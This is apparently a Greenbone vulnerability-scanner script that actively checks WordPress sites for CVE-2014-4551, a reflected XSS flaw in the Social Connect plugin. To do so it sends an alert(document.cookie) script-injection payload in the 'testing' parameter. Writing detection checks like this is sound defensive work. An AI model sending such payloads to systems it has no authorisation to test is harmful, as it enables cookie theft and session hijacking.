# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804677");
  script_version("2025-06-03T05:40:40+0000");
  script_cve_id("CVE-2014-4551");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-06-03 05:40:40 +0000 (Tue, 03 Jun 2025)");
  script_tag(name:"creation_date", value:"2014-07-14 14:43:06 +0530 (Mon, 14 Jul 2014)");
  script_name("WordPress Social Connect Plugin <= 1.0.4 XSS Vulnerability - Active Check");

  script_tag(name:"summary", value:"WordPress Social Connect Plugin is prone to a cross-site
  scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'testing' parameter to
  /social-connect/diagnostics/test.php script is not properly sanitised before being returned to the
  user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress Social Connect plugin version 1.0.4 and earlier.");

  script_tag(name:"solution", value:"Update to the latest version of the WordPress Social Connect
  plugin.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://codevigilant.com/disclosure/wp-plugin-social-connect-a3-cross-site-scripting-xss/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65103");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/social-connect/diagnostics/test.php?testing" +
            "='><script>alert(document.cookie)</script>" ;

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document\.cookie\)</script>",
   extra_check:">Social Connect Diagnostics<")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
